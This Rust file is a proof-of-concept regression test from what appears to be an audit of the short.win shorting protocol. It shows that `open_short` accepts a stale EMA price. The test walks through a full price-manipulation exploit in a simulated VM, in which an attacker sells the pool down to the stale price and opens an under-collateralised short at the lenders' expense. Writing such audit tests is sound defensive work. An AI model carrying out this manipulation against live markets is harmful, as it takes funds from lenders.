//! PoC 02 (`shortwin|open-short|stale-ema-open-margin`): `open_short` does not check the age of
//! `P_ema`.
//!
//! The finding: `open_short` reads `P_ema` for the D4 margin, the caps and the spot/EMA guard but
//! never checks how old it is (no line reads `market.ema_ts`). A market that holds lender tokens
//! and has no open position is never cranked — `services/keeper/src/decide.rs::market_needs` gives
//! a position-less market no per-second cadence — so its `P_ema` ages while the live price moves.
//! An attacker sells the idle pool back down to the stale-low `P_ema`, opens a short there (margin
//! priced at the stale-low price), and buys back; the position is under-collateralised and the
//! lenders bear the loss.
//!
//! The finding's Fix adds to `open_short` step 4:
//! `require!(now.saturating_sub(market.ema_ts) <= shortwin_math::consts::COVERAGE_GAP_S,
//!  ShortwinError::EmaWarmingUp)`.
//!
//! This regression test asserts that SAFE behaviour: the stale-EMA open must be refused with
//! `EmaWarmingUp`. On the audited 1.0.1 build there is no such check, so the open lands — the
//! final assertion fails and prints the lenders' shortfall. After the fix the open is refused and
//! the test passes.
//!
//! Harness: the mock venue (test-venue build; `open_short` is byte-identical to the audited
//! release, and the step-4 open guard where the bug lives is venue-independent — the Raydium /
//! PumpSwap `ema_warm` blocks are skipped for the mock, so the mock isolates the missing age
//! check). Every short.win account reaches its state through real instructions; the only
//! "written" state is the mock pool's reserves, moved by real whale/attacker swaps, and the
//! clock, advanced by `warp` — both stand for ordinary market activity and the passage of time.

#![allow(clippy::result_large_err)]

#[path = "engine_it/common.rs"]
mod common;

use common::*;
use shortwin::errors::ShortwinError as E;
use shortwin::events::Open;
use shortwin::venues::ExtrasSel;
use shortwin_litesvm_tests::engine::open_short_ix;
use shortwin_math::consts::COVERAGE_GAP_S;

const SOL: u64 = 1_000_000_000;

/// The live price rises to `F x` the stale `P_ema` while the market is idle.
const F: u128 = 9;

#[test]
fn open_short_accepts_a_stale_ema_and_undercollateralises_the_lenders() {
    // ---- 1. an idle mock market: lender inventory, no position, never cranked ---------------
    // `create_market` seeds the observation with `Observation::new` (an empty bucket, `ema_ts =
    // now`); the lender deposit runs `roll_only` and records nothing. Nothing then cranks it.
    let spec = MarketSpec {
        base: 1_000_000_000_000_000, // 1e15 raw tokens
        quote: 1_000_000_000_000,    // 1,000 SOL
        fee_ppm: 2_500,              // 25 bps
        lend: 100_000_000_000_000,   // 1e14 raw (10 % of the pool) lent
        // > market_warmup_s (50, so the open clears the warm-up guard) and > COVERAGE_GAP_S (40,
        // so P_ema is already "old"): the moment an idle market is first openable, its EMA is stale.
        warmup: 60,
        ..MarketSpec::default()
    };
    let (mut env, mm) = setup_with(spec);
    let m0 = env.market(&mm.market());
    let p0 = m0.ema_price.get();
    println!(
        "[setup] P_ema(listing)={p0}  ema_ts={}  now={}  b_lo={}  open_positions={}",
        m0.ema_ts,
        env.now(),
        m0.b_lo.get(),
        m0.open_positions
    );
    assert_eq!(m0.open_positions, 0, "the market is idle: no position");
    assert_eq!(m0.b_lo.get(), 0, "no observation bucket is open");

    // ~3 SOL of notional at P_ema; fits every default cap (the engine tests' `Q`).
    let q: u64 = 3_000_000_000_000;

    // ---- 2. other traders push the live price up F x while the market is idle ---------------
    // A real whale buy on the pool; no crank follows (an idle, position-less market gets none).
    let whale = env.actor(&mm, 0, 200_000 * SOL);
    env.push_price(&mm, &whale, p0 * F);
    let true_spot = env.spot(&mm);
    // The honest replacement cost of the q borrowed tokens at the live price (what it costs to buy
    // them back once the attacker restores the pool).
    let b_true = quote_buy(&env, &mm, q);
    println!(
        "[pushed] live spot={true_spot} (~{}x P_ema)  B_hat(q) at live price = {b_true} lamports (~{:.3} SOL)",
        true_spot / p0.max(1),
        b_true as f64 / 1e9
    );

    // ---- 3. the attacker sells the idle pool back down to ~P_ema ----------------------------
    // A real attacker sale (it holds token inventory, returned when it buys back after the open).
    let attacker = env.actor(&mm, 2_000_000_000_000_000, 1_000 * SOL);
    env.push_price(&mm, &attacker, p0);
    let spot_lo = env.spot(&mm);

    // ---- 4. the stale, idle market at the moment of the open --------------------------------
    let m = env.market(&mm.market());
    let p_ema = m.ema_price.get();
    let age = env.now() - m.ema_ts;
    let dev_bps = spot_lo.abs_diff(p_ema).saturating_mul(10_000) / p_ema.max(1);
    println!(
        "[attack] P_ema={p_ema} (stale)  spot after sell-down={spot_lo} ({dev_bps} bps off P_ema)  \
         ema_ts={}  now={}  age={age}s  COVERAGE_GAP_S={COVERAGE_GAP_S}  b_lo={}",
        m.ema_ts,
        env.now(),
        m.b_lo.get()
    );
    // Preconditions of a faithful stale-EMA open (they hold on 1.0.1 and after the fix alike):
    // the roll at open integrates nothing (empty bucket), so ema_ts stays old; the EMA is older
    // than COVERAGE_GAP_S; and the sold-down spot is within open_ema_dev_bps of the stale P_ema.
    assert_eq!(m.b_lo.get(), 0, "the open's roll integrates nothing: ema_ts stays old");
    assert!(age > COVERAGE_GAP_S, "P_ema is older than COVERAGE_GAP_S ({age} > {COVERAGE_GAP_S})");
    assert!(dev_bps <= 1_000, "spot is sold back to within open_ema_dev_bps of P_ema ({dev_bps} bps)");

    // ---- 5. the attacker opens the short (sent on a clone of the VM) -------------------------
    let b = env.borrower();
    let ix = open_short_ix(&mm, &b.key(), 0, q, 0, u64::MAX, u64::MAX, ExtrasSel::NONE, &[]);
    let tx = env.transaction(&[ix], &[&b.kp]);
    let res = {
        let mut svm = env.svm.clone();
        svm.send_transaction(tx)
    };
    let opened = res.is_ok();
    let code = custom_code(&res);

    match &res {
        Ok(meta) => {
            let ev = events::of::<Open>(meta)
                .into_iter()
                .next()
                .expect("Open event");
            let shortfall = b_true.saturating_sub(ev.v);
            println!(
                "[1.0.1: open LANDED] q={} s={} m={} V=S+M={} n_open(B_spot)={} b_ema={} tier={}",
                ev.q, ev.s, ev.m, ev.v, ev.n_open, ev.b_ema, ev.tier
            );
            println!(
                "  margin locks V={:.3} SOL, priced at the stale-low P_ema; the q borrowed tokens \
                 are worth B_hat={:.3} SOL at the live price",
                ev.v as f64 / 1e9,
                b_true as f64 / 1e9
            );
            println!(
                "  => the position is under-collateralised; the lenders cannot recover \
                 ~{:.3} SOL ({shortfall} lamports) once the price is restored",
                shortfall as f64 / 1e9
            );
            assert!(
                shortfall > 0,
                "harm: live replacement cost B_true={b_true} must exceed locked V={}",
                ev.v
            );
        }
        Err(_) => println!("[fixed: open REFUSED] code={code:?} (the stale-EMA open is refused)"),
    }

    // ---- 6. the regression assertion ---------------------------------------------------------
    // SAFE behaviour (the Fix): a stale-EMA open is refused with EmaWarmingUp. On 1.0.1 there is
    // no age check, so `code` is `None` (the open landed) and this fails, printing the harm.
    assert_eq!(
        code,
        Some(u32::from(E::EmaWarmingUp)),
        "open_short accepted a short against a P_ema {age}s old (> COVERAGE_GAP_S={COVERAGE_GAP_S}): \
         it locked the D4 margin at the stale-low P_ema while the {q} borrowed tokens are worth \
         ~{:.1} SOL at the live price, so the lenders bear the shortfall (open landed: {opened})",
        b_true as f64 / 1e9
    );
}
